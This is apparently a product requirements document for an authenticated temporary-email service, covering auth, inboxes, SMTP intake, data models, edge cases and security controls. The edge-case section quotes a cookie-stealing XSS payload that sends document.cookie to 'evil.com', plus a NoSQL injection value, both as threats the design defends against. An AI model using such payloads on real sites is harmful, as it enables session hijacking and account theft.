# Product Requirements Document

## Disposable Email Service (Temp Mail)

|                    |                            |
| ------------------ | -------------------------- |
| **Version**        | 1.0                        |
| **Status**         | Draft — Internal Review    |
| **Author**         | Product & Engineering Team |
| **Last updated**   | March 2026                 |
| **Classification** | Confidential               |

---

## Table of Contents

1. [Product Overview](#1-product-overview)
2. [Users and Roles](#2-users-and-roles)
3. [Functional Requirements](#3-functional-requirements)
4. [Non-Functional Requirements](#4-non-functional-requirements)
5. [API Contract](#5-api-contract)
6. [Data Models](#6-data-models)
7. [Edge Cases and Handling](#7-edge-cases-and-handling)
8. [Security Requirements](#8-security-requirements)
9. [Phased Roadmap](#9-phased-roadmap)
10. [Cost Estimate](#10-cost-estimate)
11. [Open Questions](#11-open-questions)
12. [Appendix](#12-appendix)

---

## 1. Product Overview

### 1.1 Purpose

The Disposable Email Service (DES) allows authenticated users to generate temporary, receive-only email addresses that expire automatically. It enables users to protect their primary inbox from spam, sign up for services anonymously, and inspect incoming mail through a clean web interface — without creating permanent email infrastructure.

### 1.2 Problem Statement

Primary email inboxes are routinely exposed during online sign-ups, leading to spam, phishing, and unwanted marketing. Existing disposable email tools offer zero authentication, making them a vector for abuse. DES provides the convenience of temp mail within a gated, authenticated experience — dramatically reducing misuse while retaining full usability.

### 1.3 Goals and Non-Goals

**In scope (v1)**

- Authenticated user registration via email/password and OAuth (Google, GitHub)
- On-demand temporary email address generation (per authenticated user)
- Real-time email reception and display via WebSocket (Socket.io)
- Automatic expiry and deletion of inboxes and messages via MongoDB TTL index
- Secure, sanitised rendering of HTML email bodies (DOMPurify)
- Per-user inbox management — create, list, delete

**Out of scope (v1)**

- Outbound email sending of any kind
- Custom domain configuration by end-users
- Mobile native apps (iOS / Android)
- Email forwarding to a user's primary address
- Admin abuse dashboard (planned v2)
- Attachment binary storage (metadata only in v1)

### 1.4 Success Metrics

| Metric                                        | Target          | Measurement           |
| --------------------------------------------- | --------------- | --------------------- |
| Email delivery latency (SMTP → inbox visible) | P95 < 2 seconds | Production monitoring |
| API response time                             | P95 < 500 ms    | Production monitoring |
| Auth success rate                             | > 99%           | Monthly average       |
| System uptime                                 | 99% monthly     | Uptime monitor        |
| Inbox creation error rate                     | < 0.5%          | Error tracking        |
| Spam / abuse rate                             | < 1% of inboxes | Manual audit          |

---

## 2. Users and Roles

| Role               | Description                | Key Capabilities                                     |
| ------------------ | -------------------------- | ---------------------------------------------------- |
| Anonymous visitor  | Unauthenticated browser    | Register, initiate OAuth only                        |
| Authenticated user | Logged-in account holder   | Create inboxes, read emails, delete inboxes          |
| Admin _(v2)_       | Ops / trust & safety staff | View abuse reports, suspend accounts, monitor system |

---

## 3. Functional Requirements

### 3.1 Authentication

#### FR-AUTH-01 — Email / password registration

- Accept `name`, `email`, and `password`
- Validate: email format (RFC 5322), password minimum 8 characters with at least one number or symbol
- Hash password with bcrypt (cost factor 12) before persisting
- Return access token (15-min JWT) in response body and refresh token (7-day JWT) in `HttpOnly Secure SameSite=Strict` cookie

#### FR-AUTH-02 — Email / password login

- Verify email exists and `provider === "local"`
- Compare bcrypt hash; return `401` with a generic message on failure (no oracle exposure — never reveal whether the email exists)
- Rotate refresh token on every successful login

#### FR-AUTH-03 — OAuth login (Google)

- Redirect to provider; receive profile via Passport.js callback
- **Upsert user:** create account if email is unseen, otherwise link OAuth identity to the existing account
- Issue identical JWT pair as local login
- Redirect to frontend with access token as a short-lived query param; client strips it from the URL after consumption

#### FR-AUTH-04 — Token refresh

- `POST /auth/refresh` reads refresh token from `HttpOnly` cookie
- Validate stored refresh token matches DB record; if mismatch, null out the DB token and return `401` — all sessions for that user are invalidated (token reuse detection)
- Issue new access token; rotate refresh token (sliding window)

#### FR-AUTH-05 — Logout

- Clear the `refreshToken` cookie
- Null out `refreshToken` field in MongoDB (server-side invalidation ensures stolen cookies cannot be replayed)

---

### 3.2 Inbox Management

#### FR-INBOX-01 — Create inbox

- Authenticated users only
- Generate random 8-character alphanumeric local-part + configured domain (e.g. `abc12345@yourdomain.com`)
- Persist `Inbox` document with `owner` reference and `expiresAt` (default TTL 30 min, configurable via `INBOX_TTL_MINUTES` env var, range 10–60 min)
- MongoDB TTL index on `expiresAt` auto-deletes the document at expiry — no cron job needed
- Return inbox email address and `expiresAt` to client

#### FR-INBOX-02 — List inboxes

- Return all active inboxes owned by the authenticated user, sorted by `createdAt` descending
- Include `email`, `createdAt`, `expiresAt`, and `unreadCount` per inbox

#### FR-INBOX-03 — Delete inbox

- Owner only; service always queries `{ _id, owner: req.user._id }` — never expose other users' inboxes
- Hard-delete the inbox document
- Cascade-delete all associated email documents via a Mongoose `pre('deleteOne')` hook
- Return `204 No Content` on success

---

### 3.3 Email Reception (SMTP)

#### FR-SMTP-01 — Receive inbound email

- Haraka SMTP server listens on port 25
- DNS MX record resolves to the server's public IP
- Accept `RCPT TO` only if a matching active `Inbox` document exists (validator plugin)
- Return SMTP `550 No such mailbox` for unknown or expired addresses

#### FR-SMTP-02 — Parse and store email

- Parse raw message stream with `mailparser` (from, subject, HTML body, text body, attachments)
- Strip dangerous HTML via DOMPurify **before** persistence — stored body is already clean
- Create an `Email` document linked to `Inbox._id`
- Set `email.expiresAt = inbox.expiresAt` so the email auto-deletes with its inbox
- Emit a Socket.io `new_email` event to the inbox room after successful save

#### FR-SMTP-03 — Attachment handling

- Reject attachments > 5 MB per file at the SMTP layer
- Store attachment **metadata only** in v1: `{ filename, size, mimeType }` — no binary storage
- Total message size limit: 10 MB (enforced by Haraka before parsing)

---

### 3.4 Email Reading

#### FR-EMAIL-01 — List emails in inbox

- `GET /email/inbox/:inboxId` — returns all emails for the inbox, sorted by `createdAt` descending
- Validate ownership: `inbox.owner === req.user._id`
- Response includes `from`, `subject`, `createdAt`, `read` flag — **not** the full body (reduces payload)

#### FR-EMAIL-02 — Read email detail

- `GET /email/:id` — returns full email including sanitised HTML body
- Mark `email.read = true` on successful fetch
- Ownership validated via `email.inboxId → inbox.owner`

---

### 3.5 Real-Time Updates

- Frontend subscribes via Socket.io to a room named after the inbox email address: `socket.emit('subscribe', email)`
- On new email saved, server emits `new_email` event to that room
- Client appends new email to the inbox list without any polling
- On inbox expiry (detected via MongoDB change stream), server emits `inbox_expired` event; client shows an expiry notice and stops further activity

---

## 4. Non-Functional Requirements

| Category            | Requirement       | Detail                                                                                    |
| ------------------- | ----------------- | ----------------------------------------------------------------------------------------- |
| **Performance**     | Delivery latency  | SMTP → inbox P95 < 2 s                                                                    |
|                     | API throughput    | Handle 100 concurrent SMTP connections without queuing                                    |
|                     | API response      | P95 < 500 ms across all endpoints                                                         |
| **Security**        | Tokens            | JWT HS256; access 15 min; refresh 7 days in HttpOnly cookie                               |
|                     | Rate limiting     | 60 req/min per IP globally; 5 auth attempts/min per IP                                    |
|                     | HTTP headers      | Helmet.js: CSP, HSTS max-age 31536000, X-Frame-Options DENY, nosniff                      |
|                     | HTML sanitisation | DOMPurify strips scripts, event handlers, `javascript:` URIs on ingest                    |
| **Scalability**     | Stateless API     | JWT-based; no server-side session; horizontal scaling ready                               |
|                     | DB indexing       | Indexes on `Inbox.owner`, `Inbox.email`, `Email.inboxId`, all TTL fields                  |
| **Reliability**     | SMTP retry        | Haraka returns `451 Temporary failure` (not `550`) on DB unavailability so sender retries |
|                     | Graceful shutdown | `SIGTERM` drains in-flight requests before process exit                                   |
|                     | No email loss     | Emails written to DB before Socket.io event is emitted                                    |
| **Maintainability** | Architecture      | Feature-first MVC; one concern per file; all config via env vars                          |
|                     | Logging           | Structured JSON logs; never log passwords, tokens, or full email bodies                   |

---

## 5. API Contract

### 5.1 Auth Endpoints

| Method | Path                    | Auth Required           | Description                    |
| ------ | ----------------------- | ----------------------- | ------------------------------ |
| `POST` | `/auth/register`        | No                      | Register with email + password |
| `POST` | `/auth/login`           | No                      | Login with email + password    |
| `GET`  | `/auth/google`          | No                      | Initiate Google OAuth flow     |
| `GET`  | `/auth/google/callback` | No                      | Google OAuth callback          |
| `POST` | `/auth/refresh`         | Cookie (`refreshToken`) | Issue new access token         |
| `POST` | `/auth/logout`          | Bearer JWT              | Invalidate session             |

### 5.2 Inbox Endpoints

| Method   | Path         | Auth Required | Description                     |
| -------- | ------------ | ------------- | ------------------------------- |
| `POST`   | `/inbox`     | Bearer JWT    | Create new temporary inbox      |
| `GET`    | `/inbox`     | Bearer JWT    | List all user's active inboxes  |
| `DELETE` | `/inbox/:id` | Bearer JWT    | Delete inbox and all its emails |

### 5.3 Email Endpoints

| Method | Path                    | Auth Required | Description                    |
| ------ | ----------------------- | ------------- | ------------------------------ |
| `GET`  | `/email/inbox/:inboxId` | Bearer JWT    | List emails in inbox (no body) |
| `GET`  | `/email/:id`            | Bearer JWT    | Get full email + mark as read  |

### 5.4 Response Shape Examples

**POST /inbox — success**

```json
{
  "inbox": {
    "_id": "664a1f...",
    "email": "abc12345@yourdomain.com",
    "expiresAt": "2026-03-25T11:30:00.000Z",
    "createdAt": "2026-03-25T11:00:00.000Z"
  }
}
```

**GET /email/:id — success**

```json
{
  "email": {
    "_id": "664b2e...",
    "from": "sender@example.com",
    "subject": "Your verification code",
    "body": "<p>Your code is <strong>482910</strong></p>",
    "attachments": [],
    "read": true,
    "createdAt": "2026-03-25T11:02:14.000Z"
  }
}
```

**Error shape (all endpoints)**

```json
{
  "error": "INBOX_LIMIT_REACHED",
  "message": "You have reached the maximum of 10 active inboxes."
}
```

---

## 6. Data Models

### 6.1 User

| Field           | Type     | Required   | Notes                                       |
| --------------- | -------- | ---------- | ------------------------------------------- |
| `_id`           | ObjectId | Auto       | MongoDB primary key                         |
| `name`          | String   | Yes        | Display name                                |
| `email`         | String   | Yes        | Unique, lowercase, indexed                  |
| `password`      | String   | Local only | bcrypt hash; `null` for OAuth users         |
| `provider`      | String   | Yes        | Enum: `local` \| `google` \| `github`       |
| `providerId`    | String   | OAuth only | Provider's user ID                          |
| `refreshToken`  | String   | No         | Current valid refresh JWT; nulled on logout |
| `loginFailures` | Number   | No         | Consecutive failed logins; reset on success |
| `lockedUntil`   | Date     | No         | Account lock expiry timestamp               |
| `createdAt`     | Date     | Auto       | Mongoose timestamps                         |
| `updatedAt`     | Date     | Auto       | Mongoose timestamps                         |

### 6.2 Inbox

| Field       | Type     | Required | Notes                                             |
| ----------- | -------- | -------- | ------------------------------------------------- |
| `_id`       | ObjectId | Auto     | Primary key                                       |
| `email`     | String   | Yes      | Unique temp address; indexed                      |
| `owner`     | ObjectId | Yes      | Ref: `User._id`; indexed                          |
| `expiresAt` | Date     | Yes      | **TTL index** — MongoDB auto-deletes at this time |
| `active`    | Boolean  | Yes      | Default `true`; set `false` on manual delete      |
| `createdAt` | Date     | Auto     | Mongoose timestamps                               |

### 6.3 Email

| Field            | Type     | Required | Notes                                     |
| ---------------- | -------- | -------- | ----------------------------------------- |
| `_id`            | ObjectId | Auto     | Primary key                               |
| `inboxId`        | ObjectId | Yes      | Ref: `Inbox._id`; indexed                 |
| `to`             | String   | Yes      | Recipient temp address                    |
| `from`           | String   | Yes      | Sender address                            |
| `subject`        | String   | No       | Defaults to `"(no subject)"`              |
| `body`           | String   | No       | DOMPurify-sanitised HTML                  |
| `attachments`    | Array    | No       | `[{ filename, size, mimeType }]`          |
| `messageId`      | String   | No       | Sparse unique index for deduplication     |
| `read`           | Boolean  | Yes      | Default `false`                           |
| `hasValidSender` | Boolean  | Yes      | `false` when From header is absent        |
| `expiresAt`      | Date     | Yes      | **TTL index** — mirrors `inbox.expiresAt` |
| `createdAt`      | Date     | Auto     | Mongoose timestamps                       |

### 6.4 MongoDB Indexes Summary

```
User:  { email: 1 }  unique
Inbox: { email: 1 }  unique
Inbox: { owner: 1 }
Inbox: { expiresAt: 1 }  expireAfterSeconds: 0  ← TTL
Email: { inboxId: 1 }
Email: { messageId: 1 }  sparse unique
Email: { expiresAt: 1 }  expireAfterSeconds: 0  ← TTL
```

---

## 7. Edge Cases and Handling

### 7.1 Authentication Edge Cases

#### EC-AUTH-01 — OAuth email collision

> **Scenario:** User registers with email/password, then later logs in via Google using the same email address.

- Detect the existing account by email in `upsertOAuthUser`
- Link `provider` and `providerId` to the existing document; do not create a duplicate
- Respond normally — user is logged in; no destructive action taken

#### EC-AUTH-02 — Refresh token reuse attack

> **Scenario:** A refresh token is stolen and used after the legitimate client has already rotated it.

- On refresh, compare incoming token against the stored DB record
- If mismatch: null out `refreshToken` in DB and return `401` — **all** sessions for that user are invalidated
- User must re-authenticate from scratch; log the anomaly for security review

#### EC-AUTH-03 — Concurrent login from multiple devices

> **Scenario:** User logs in from phone and laptop simultaneously.

- v1: single refresh token per user — second login overwrites the first; first device is silently logged out on its next refresh attempt (receives `401 TOKEN_REUSE`)
- v2 recommendation: store `[{ token, deviceId, lastUsed }]` array for proper multi-session support

#### EC-AUTH-04 — OAuth provider returns no email

> **Scenario:** GitHub account has private email or no verified email configured.

- Fall back to `{username}@github.com` as a synthetic placeholder email
- Flag account with `needsEmailVerification: true`
- Block inbox creation until a real email is provided and acknowledged

#### EC-AUTH-05 — Brute-force login attempts

> **Scenario:** Attacker submits thousands of password guesses against a known email.

- Rate-limit `/auth/login` to 5 attempts per IP per minute via `express-rate-limit`
- After 10 consecutive failures for a specific account, set `lockedUntil = now + 15min`
- Return `429 Too Many Requests` with `Retry-After` header — never reveal lock reason in message body

#### EC-AUTH-06 — Expired access token with valid refresh token

> **Scenario:** Client sends a request with a 15-minute expired JWT.

- API returns `401` with error code `TOKEN_EXPIRED` (distinct from `TOKEN_INVALID` so clients can act differently)
- Frontend intercepts `401 TOKEN_EXPIRED`, silently calls `POST /auth/refresh`, retries the original request transparently

#### EC-AUTH-07 — Account deletion with active inboxes

> **Scenario:** User deletes their account while they have active inboxes receiving mail.

- Cascade-delete all `Inbox` documents for that `userId`
- MongoDB TTL on `Email.expiresAt` cleans up orphaned emails; alternatively use a `pre('deleteMany')` hook
- SMTP validator plugin immediately starts rejecting all mail for those addresses (`550`)

---

### 7.2 Inbox Edge Cases

#### EC-INBOX-01 — Generated address collision

> **Scenario:** The randomly generated address already exists in the `Inbox` collection.

- Wrap `Inbox.create()` in try/catch on `MongoServerError code 11000` (duplicate key)
- Retry up to 5 times with a freshly generated string
- If 5 retries exhausted, return `503 Service Unavailable` with `Retry-After: 5`
- Monitor collision rate; if > 0.1%, increase local-part length from 8 to 12 characters

#### EC-INBOX-02 — Inbox expires while user is actively viewing it

> **Scenario:** MongoDB TTL fires and deletes the inbox document mid-session.

- Watch the `Inbox` collection via a MongoDB change stream; on `delete` event, emit `inbox_expired` via Socket.io to the inbox room
- Client shows "This inbox has expired" banner and disables all further UI interactions
- Subsequent API calls return `404`; client handles gracefully without throwing an unhandled error

#### EC-INBOX-03 — User creates excessive inboxes

> **Scenario:** An authenticated user creates hundreds of inboxes to harvest addresses or stress the system.

- Enforce per-user limit: max 10 **active** inboxes simultaneously (configurable via `MAX_INBOXES_PER_USER` env var)
- Check `Inbox.countDocuments({ owner: userId, active: true, expiresAt: { $gt: now } })` before creating
- Return `429` with error code `INBOX_LIMIT_REACHED` and message explaining the cap

#### EC-INBOX-04 — IDOR — accessing another user's inbox

> **Scenario:** Attacker guesses a valid `ObjectId` and calls `DELETE /inbox/:id` or `GET /email/inbox/:id`.

- Service always queries `{ _id: inboxId, owner: req.user._id }`
- If not found (whether it doesn't exist or belongs to another user), return `404` — never `403`
- This prevents confirming whether the resource exists at all (no information leak)

---

### 7.3 Email Reception Edge Cases

#### EC-SMTP-01 — Email arrives after inbox expiry

> **Scenario:** An SMTP message arrives after the inbox TTL has passed.

- Validator plugin queries `Inbox.findOne({ email: to, active: true, expiresAt: { $gt: new Date() } })`
- If not found, return SMTP `550 No such mailbox` — mail rejected at envelope level; no bounce generated for the sender

#### EC-SMTP-02 — Malformed or oversized email

> **Scenario:** Attacker sends a 50 MB email with a pathological MIME structure designed to crash the parser.

- Haraka DATA size limit: reject messages > 10 MB **before** parsing (configured in `smtp.ini`)
- `mailparser` `maxHtmlLength` and `maxTextLength` capped at 500 KB each
- Attachment binaries not stored — only metadata extracted — so no disk exhaustion risk

#### EC-SMTP-03 — XSS payload in email body

> **Scenario:** Attacker sends `<script>fetch('https://evil.com?c='+document.cookie)</script>` in the HTML body.

- DOMPurify strips all `<script>` tags, inline event handlers (`onclick`, `onerror`, etc.), and `javascript:` href values **before** DB persistence — the stored body is already clean
- Frontend additionally renders the body inside a `sandbox`-attributed `<iframe>` for defence in depth

#### EC-SMTP-04 — Email flood / spam storm targeting one inbox

> **Scenario:** 10,000 emails arrive to a single inbox within seconds.

- SMTP-layer rate limit: max 20 emails per sender IP per minute (Haraka `karma` plugin)
- Per-inbox hard cap: max 100 emails stored; on exceeding the cap, return SMTP `452 Insufficient system storage` and discard
- Alert engineering if a single inbox receives > 50 emails within any 5-minute window

#### EC-SMTP-05 — Email arrives with no From header

> **Scenario:** Malformed sender — RFC 5321 technically permits a null reverse-path (e.g. delivery status notifications).

- Default `from` field to `"(unknown sender)"` — do not crash the parser
- Store email normally; set `hasValidSender: false` on the document for potential future abuse flagging

#### EC-SMTP-06 — SMTP connection drops mid-transfer

> **Scenario:** Sender disconnects after issuing `DATA` but before sending the final dot.

- Haraka handles connection abort internally — `hook_data_post` does not fire
- No partial document is written to MongoDB; the incomplete message is silently discarded

#### EC-SMTP-07 — Duplicate message delivery (same Message-ID)

> **Scenario:** Sender's MTA retransmits the same email due to a timeout, resulting in two identical deliveries.

- Store `Message-ID` header on the `Email` document with a sparse unique index
- On `MongoServerError 11000`, return SMTP `250 OK` to the sender (so they stop retrying) but skip persistence
- Deduplication is transparent — the sender never knows

---

### 7.4 Security Edge Cases

#### EC-SEC-01 — JWT secret rotation

> **Scenario:** `JWT_SECRET` is compromised and must be rotated without a full outage.

- Deploy new secret; all existing tokens are immediately invalid — affected users re-authenticate
- For zero-downtime rotation: support `PREVIOUS_JWT_SECRET` env var; verify with new secret first, fall back to old, then remove `PREVIOUS_JWT_SECRET` after one token lifetime (15 min)

#### EC-SEC-02 — NoSQL injection via route parameters

> **Scenario:** Attacker passes `{ "$gt": "" }` as the `:email` parameter to bypass inbox ownership check.

- Validate all user-supplied strings with `express-validator` before they reach Mongoose
- Explicitly cast `req.params.email` to string and assert it matches `/^[^@]+@[^@]+\.[^@]+$/`
- Mongoose strict mode (default) prevents prototype pollution via query objects

#### EC-SEC-03 — CORS misconfiguration

> **Scenario:** Frontend URL changes; CORS blocks all cross-origin requests, or is accidentally widened to `*`.

- `ALLOWED_ORIGINS` is an env-var array — update without redeployment
- In middleware: `origin: (origin, cb) => allowedOrigins.includes(origin) ? cb(null, true) : cb(new Error('CORS'))`
- Never use wildcard `*` when `credentials: true` is set — browsers block it anyway, but it signals misconfiguration

#### EC-SEC-04 — Domain blacklisting by receiving mail servers

> **Scenario:** Major email providers block the DES domain as a spam source.

- DES is receive-only — no outbound mail — so blacklisting does not affect deliverability from external senders
- Register multiple MX domains; rotate between them in DNS to distribute reputation risk
- Monitor domain reputation via Google Postmaster Tools; retire blacklisted domains promptly

#### EC-SEC-05 — Dependency vulnerability in a third-party package

> **Scenario:** A CVE is published for `mailparser`, `passport`, or another core dependency.

- Run `npm audit` in CI; fail the build on `high` or `critical` severity findings
- Use Dependabot or Renovate for automated patch PRs
- Pin major versions; review changelog before bumping

---

### 7.5 Infrastructure Edge Cases

#### EC-INFRA-01 — MongoDB connection loss mid-request

> **Scenario:** The database goes offline while a request is in flight.

- Mongoose reconnect with exponential backoff (max 5 retries, 30 s max delay)
- SMTP validator returns SMTP `451 Temporary failure` (not `550`) so the sender's MTA retries later
- API returns `503 Service Unavailable` with `Retry-After: 30`

#### EC-INFRA-02 — SMTP port 25 blocked by cloud provider

> **Scenario:** AWS and GCP block outbound port 25; inbound may also be restricted on some plans.

- Use a VPS provider that allows inbound port 25 without a manual unblock request (Hetzner, OVH, Linode)
- Alternative: use a dedicated SMTP relay service that accepts port 587/465 and forwards to your Haraka instance
- Document the chosen provider and port configuration in the deployment runbook

#### EC-INFRA-03 — TTL index missing on a fresh MongoDB instance

> **Scenario:** The collection is created before the TTL index migration runs — documents never expire.

- Set `autoIndex: false` in production Mongoose config
- Run a dedicated `ensureIndexes.js` migration script in the CI deployment pipeline **before** the application starts
- Health-check endpoint verifies critical index existence on startup; refuse traffic if missing

#### EC-INFRA-04 — Socket.io server restart drops all active subscriptions

> **Scenario:** A rolling deploy or crash restarts the Node process; connected clients lose their room subscriptions.

- Client implements reconnection with exponential backoff (Socket.io does this by default)
- On reconnect, client re-emits `subscribe` with the current inbox email
- Consider sticky sessions (via `cookie` or `ip_hash` in nginx) if scaling to multiple Node instances; or use the `@socket.io/redis-adapter` for shared pub/sub state

---

## 8. Security Requirements

| Control               | Implementation                                                                                            |
| --------------------- | --------------------------------------------------------------------------------------------------------- |
| Password storage      | bcrypt, cost factor 12; never stored in plaintext or reversible encoding                                  |
| Token transport       | Access token in memory only (response body); refresh token in `HttpOnly Secure SameSite=Strict` cookie    |
| HTML rendering        | DOMPurify on ingest + sandboxed `<iframe>` on frontend display                                            |
| Rate limiting         | `express-rate-limit`: 60 req/min global; 5/min on auth routes per IP                                      |
| HTTP security headers | Helmet.js: CSP, HSTS `max-age=31536000`, `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`       |
| Input validation      | `express-validator` on all routes; Mongoose strict mode; typed param casting                              |
| CORS                  | Explicit `ALLOWED_ORIGINS` allowlist; `credentials: true`; no wildcard in production                      |
| SMTP auth             | No client auth on port 25 (standard receive-only); opportunistic TLS via STARTTLS                         |
| Secrets management    | All secrets via environment variables; never committed to source control; rotate on suspected compromise  |
| Logging               | Structured JSON; log IP, method, path, status code; **never** log passwords, tokens, or full email bodies |
| Dependency scanning   | `npm audit` in CI; Dependabot for automated patch PRs                                                     |
| Account lockout       | 10 consecutive failed logins locks account for 15 minutes                                                 |

---

## 9. Phased Roadmap

| Phase       | Timeline   | Deliverables                                                                                            |
| ----------- | ---------- | ------------------------------------------------------------------------------------------------------- |
| **MVP**     | Weeks 1–4  | SMTP reception, local + OAuth auth, inbox CRUD, email read API, WebSocket push, MongoDB TTL auto-expiry |
| **Phase 2** | Weeks 5–8  | Multi-domain MX rotation, abuse rate limiting per inbox, admin dashboard v1, email forwarding opt-in    |
| **Phase 3** | Weeks 9–12 | Custom TTL per inbox, usage analytics, CAPTCHA on registration, mobile-responsive UI polish             |
| **Phase 4** | Weeks 13+  | Multi-session refresh tokens, attachment preview (S3 storage), API rate dashboard, SLO alerting         |

---

## 10. Cost Estimate

### MVP Monthly Cost (INR)

| Component               | Cost                | Notes                                                      |
| ----------------------- | ------------------- | ---------------------------------------------------------- |
| Domain registration     | ₹800 – ₹3,000       | Per domain; buy 2–3 for rotation                           |
| VPS (2 vCPU / 4 GB RAM) | ₹500 – ₹1,500       | Hetzner CX21 or DigitalOcean Droplet                       |
| MongoDB Atlas           | Free – ₹1,500       | M0 free tier for MVP; M10 for production TTL index support |
| **Total MVP**           | **₹1,300 – ₹6,000** |                                                            |

### Scaling Costs (Phase 3+)

| Component            | Estimated Cost        | Trigger                            |
| -------------------- | --------------------- | ---------------------------------- |
| Load balancer        | ₹800 – ₹2,000/mo      | > 500 concurrent users             |
| Additional VPS nodes | ₹500 – ₹1,500/mo each | > 70% CPU sustained                |
| MongoDB Atlas M20    | ₹3,000 – ₹5,000/mo    | > 10 GB data or higher IOPS needed |

---

## 11. Open Questions

| #   | Question                                                                      | Owner       | Status                 |
| --- | ----------------------------------------------------------------------------- | ----------- | ---------------------- |
| 1   | Should refresh tokens support multiple concurrent devices in v1?              | Engineering | 🟡 Open                |
| 2   | What is the default TTL — 30 min fixed or user-configurable per inbox?        | Product     | 🟡 Open                |
| 3   | Should attachment binaries be stored in v1 (e.g. S3)?                         | Engineering | 🔵 Deferred to Phase 4 |
| 4   | Which cloud provider allows inbound port 25 without a manual unblock request? | DevOps      | 🟢 In progress         |
| 5   | Do we need a GDPR/DPDP consent flow for OAuth user data?                      | Legal       | 🟡 Open                |
| 6   | Should we expose a public API for developers (API keys, rate-limited)?        | Product     | 🔵 Deferred to Phase 4 |
| 7   | What is the acceptable maximum number of inboxes per user?                    | Product     | 🟡 Open                |

---

## 12. Appendix

### 12.1 Environment Variables Reference

| Variable               | Required   | Default                 | Description                                      |
| ---------------------- | ---------- | ----------------------- | ------------------------------------------------ |
| `PORT`                 | No         | `3000`                  | Express server port                              |
| `MONGO_URI`            | **Yes**    | —                       | MongoDB connection string                        |
| `JWT_SECRET`           | **Yes**    | —                       | HMAC secret for access tokens                    |
| `JWT_REFRESH_SECRET`   | **Yes**    | —                       | Separate secret for refresh tokens               |
| `PREVIOUS_JWT_SECRET`  | No         | —                       | Previous secret for zero-downtime rotation       |
| `GOOGLE_CLIENT_ID`     | OAuth only | —                       | Google Cloud OAuth 2.0 app ID                    |
| `GOOGLE_CLIENT_SECRET` | OAuth only | —                       | Google Cloud OAuth 2.0 secret                    |
| `GITHUB_CLIENT_ID`     | OAuth only | —                       | GitHub OAuth app ID                              |
| `GITHUB_CLIENT_SECRET` | OAuth only | —                       | GitHub OAuth app secret                          |
| `CLIENT_URL`           | **Yes**    | `http://localhost:5173` | Frontend base URL for CORS and OAuth redirect    |
| `SMTP_DOMAIN`          | **Yes**    | —                       | Domain for generated email addresses             |
| `INBOX_TTL_MINUTES`    | No         | `30`                    | Default inbox lifetime in minutes (range: 10–60) |
| `MAX_INBOXES_PER_USER` | No         | `10`                    | Per-user active inbox cap                        |
| `ALLOWED_ORIGINS`      | **Yes**    | —                       | Comma-separated list of allowed CORS origins     |

### 12.2 npm Package Reference

```bash
# Core
express mongoose haraka mailparser

# Auth
passport passport-google-oauth20 passport-github2
jsonwebtoken bcryptjs cookie-parser

# Security
helmet cors express-rate-limit express-validator dompurify jsdom

# Real-time
socket.io

# Utilities
dotenv uuid
```

### 12.3 Glossary

| Term               | Definition                                                                                |
| ------------------ | ----------------------------------------------------------------------------------------- |
| **SMTP**           | Simple Mail Transfer Protocol — used to receive inbound email on port 25                  |
| **MX record**      | DNS record specifying the mail server responsible for a domain                            |
| **TTL**            | Time-To-Live — duration after which a resource is automatically expired or deleted        |
| **JWT**            | JSON Web Token — signed token encoding user identity and expiry claims                    |
| **OAuth 2.0**      | Authorisation framework enabling third-party login (Google, GitHub)                       |
| **bcrypt**         | Adaptive password hashing algorithm resistant to brute-force attacks                      |
| **DOMPurify**      | JavaScript library that sanitises HTML to prevent XSS attacks                             |
| **Haraka**         | Node.js SMTP server with a plugin-based inbound mail processing pipeline                  |
| **Change stream**  | MongoDB feature for real-time notification of document insertions, updates, and deletions |
| **HttpOnly**       | Cookie attribute preventing client-side JavaScript from reading the cookie value          |
| **IDOR**           | Insecure Direct Object Reference — accessing another user's resource by guessing its ID   |
| **Upsert**         | Database operation that inserts a document if it does not exist, or updates it if it does |
| **Sliding window** | Refresh token strategy where the expiry resets on every use                               |

---

_End of document — v1.0 — March 2026_
